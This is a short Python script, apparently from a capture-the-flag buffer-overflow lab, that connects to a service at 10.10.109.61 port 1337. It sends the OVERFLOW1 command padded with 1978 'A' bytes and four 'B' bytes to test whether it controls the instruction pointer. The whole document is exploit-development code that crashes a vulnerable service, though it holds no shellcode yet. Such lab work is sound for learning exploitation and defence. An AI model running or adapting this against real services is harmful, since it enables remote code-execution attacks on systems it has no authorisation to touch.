import socket, time, sys

ip = "10.10.109.61"

port = 1337
timeout = 5
prefix = "OVERFLOW1 "
offset = 1978

string = prefix + offset*"A" + 4*"B" + "HERES THE ESP"

try:
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(timeout)
    s.connect((ip, port))
    s.recv(1024)
    print("Sending {} bytes".format(len(string) - len(prefix)))
    s.send(bytes(string, "latin-1"))
    s.recv(1024)
except:
  print("Program crashed with {} bytes".format(len(string) - len(prefix)))
  sys.exit(0)
